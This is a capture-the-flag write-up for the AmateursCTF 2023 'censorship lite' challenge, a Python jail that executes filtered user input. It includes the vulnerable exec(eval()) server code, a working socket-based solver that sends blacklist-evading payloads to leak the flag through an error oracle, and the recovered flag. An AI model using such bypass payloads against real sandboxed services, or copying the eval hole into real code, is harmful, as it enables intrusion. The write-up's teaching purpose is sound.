# censorship lite

you may want to read my [censorship](https://github.com/quasar098/ctf-writeups/tree/main/amateursctf-2023/censorship) writeup for background knowledge

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/9b52555e-eb00-4671-898d-1efbaa164e90)

```py
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "\lite0123456789"]):
                raise ValueError("invalid input")
            exec(eval(code))
        except Exception as err:
            print(err)
```

## solution

here, a lot more chars a disallowed, notably the number characters

we can emulate numbers by subtracting the ascii value of integers using `ord` function

we have access to the errors, so we can test if a boolean is true by checking a one-char string with index of the boolean (true=1=error big time!!!, false=0=nothing happens)

```py
import socket
from time import sleep

HOST = "amt.rs"
PORT = 31671

chars = "abcdfghjkmnopqrsuvwxyz"
chars += chars.upper()
chars += "_{}.:-=+[]()*!@#$%^&<>,./?"
l_index = -1

total = ""
while True:
    l_index += 1
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.recv(1024)
        for char in range(48, 126):
            repeat = 'ord("b")-ord("a")+'
            index = chr(ord("a")+l_index)
            payload = f'"a"[ ord(_[ ord("a")-ord("a")+{(repeat*l_index)[:-1]} ])-' + \
                      f'( {(repeat*char)[:-1]} ) % ((ord("P")-ord("@"))*(ord("P")-ord("@") )) != (ord("P")-ord("P")) ]\n'
            s.send(payload.encode('ascii'))
            data = s.recv(65536).decode('ascii')
            sleep(0.004)
            if data.startswith("Give code"):
                total += chr(char)
                print(chr(char), l_index, total)
            # data = s.recv(1024)
            # print(char, data)

# amateursCTF{sh0uldv3_r3strict3D_p4r3nTh3ticaLs_1nst3aD}
```

we check the ascii value of each char in the flag against each number 0-255, and then get the letter at an index of a one-char string (`"a"[index]`) to get the flag via error detection

defo overengineered solution, but really close to the [censorship-lite++](https://github.com/quasar098/ctf-writeups/tree/main/amateursctf-2023/censorship-lite++) solution
